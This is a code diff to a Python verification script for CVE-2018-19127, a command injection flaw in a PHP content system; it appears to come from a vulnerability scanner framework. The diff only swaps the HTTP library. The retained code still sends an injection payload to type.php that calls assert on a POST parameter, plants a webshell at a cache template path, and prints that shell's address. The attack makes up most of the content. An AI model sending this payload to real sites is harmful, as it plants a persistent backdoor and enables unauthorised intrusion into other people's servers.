@@ -6,9 +6,7 @@ description: CVE-2018-19127 命令注入漏洞
 '''
 
 import re
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class CVE_2018_19127_BaseVerify:
     def __init__(self, url):
@@ -22,7 +20,7 @@ class CVE_2018_19127_BaseVerify:
             self.url = "http://" + self.url
         url = self.url + "/type.php?template=tag_(){};@unlink(FILE);assert($_POST[secfree]);{//../rss"
         try:
-            results = requests.get(url, headers = self.headers, allow_redirects = False, verify=False).text
+            results = request.get(url, headers = self.headers).text
             c = re.findall(r"function.assert'>(.+?)</a>",results)
             if c[0] == "function.assert":
                 print('存在CVE-2018-19127漏洞,WebShell地址为:' + self.url + '/data/cache_template/rss.tpl.php|secfree')
